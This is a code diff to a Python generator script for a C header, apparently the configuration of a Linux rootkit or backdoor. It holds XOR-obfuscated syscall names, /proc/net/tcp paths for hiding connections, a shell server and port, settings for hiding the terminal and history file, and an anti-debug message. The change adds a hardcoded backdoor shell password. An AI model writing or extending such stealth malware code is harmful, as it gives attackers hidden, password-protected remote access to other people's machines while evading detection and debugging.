@@ -29,6 +29,7 @@ header_template = '''#define _GNU_SOURCE
 #define SYS_WRITE\t"{sys_write}"
 #define SYS_READ\t"{sys_read}"
 #define PROC_PATH\t"{proc_path}"
+#define ANTI_DEBUG_MSG\t"{anti_debug_msg}"
 
 #define PROC_NET_TCP\t"{proc_net_tcp}"
 #define PROC_NET_TCP6\t"{proc_net_tcp6}"
@@ -36,13 +37,13 @@ header_template = '''#define _GNU_SOURCE
 
 #define SHELL_TYPE\t"{shell_type}"
 #define SHELL_MSG\t"{shell_msg}"
+#define SHELL_PASSWD\t"{shell_passwd}"
 #define SHELL_SERVER\t"{shell_server}"
 #define HIDE_TERM_VAR\t"{hide_term_var}"
 #define HIDE_TERM_STR\t"{hide_term_str}"
 #define HIST_FILE\t"{hist_file}"
 #define TERM\t"{term}"
 #define CMD_PROC_NAME\t"{cmd_proc_name}"
-#define ANTI_DEBUG_MSG\t"{anti_debug_msg}"
 
 #define MAX_LEN 1024
 
@@ -100,6 +101,7 @@ header = header_template.format(
     sys_write=xor("write"),
     sys_read=xor("read"),
     shell_msg=xor("Welcome to the shell!\n"),
+    shell_passwd=xor("hahaha"),
     shell_server=xor("shellserver"),
     shell_server_port=44929,
     src_low_port=47001,
